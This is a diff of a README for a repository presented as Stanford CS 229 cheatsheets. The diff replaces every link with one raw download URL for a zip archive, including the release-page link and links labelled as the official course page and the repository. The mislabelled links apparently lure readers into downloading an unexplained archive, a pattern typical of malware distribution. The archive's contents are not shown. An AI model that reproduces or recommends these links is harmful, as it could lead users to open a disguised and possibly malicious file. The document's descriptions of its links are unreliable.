@@ -1,6 +1,6 @@
 # 🌟 stanford-cs-229-machine-learning - Essential Cheatsheets for CS 229
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/anuwat1150/stanford-cs-229-machine-learning/releases)
+[![Download](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **stanford-cs-229-machine-learning** repository! This project pro
 
 To get started, you need to download the latest version of the cheatsheets. 
 
-Visit this page to download: [Releases Page](https://github.com/anuwat1150/stanford-cs-229-machine-learning/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip).
 
 Once there, click on the latest release that suits your needs. Follow the instructions based on your operating system:
 
@@ -70,8 +70,8 @@ If you have questions or need assistance, feel free to join our community. Check
 
 ## 🔗 Useful Links
 
-- [Download Cheatsheets Here](https://github.com/anuwat1150/stanford-cs-229-machine-learning/releases)
-- [CS229 Course Page](http://cs229.stanford.edu/)
-- [GitHub Repository](https://github.com/anuwat1150/stanford-cs-229-machine-learning)
+- [Download Cheatsheets Here](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip)
+- [CS229 Course Page](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/anuwat1150/stanford-cs-229-machine-learning/master/zh/cs-machine-stanford-learning-1.0-alpha.5.zip)
 
 Enjoy your journey in machine learning, and we hope these cheatsheets make it a little easier for you!
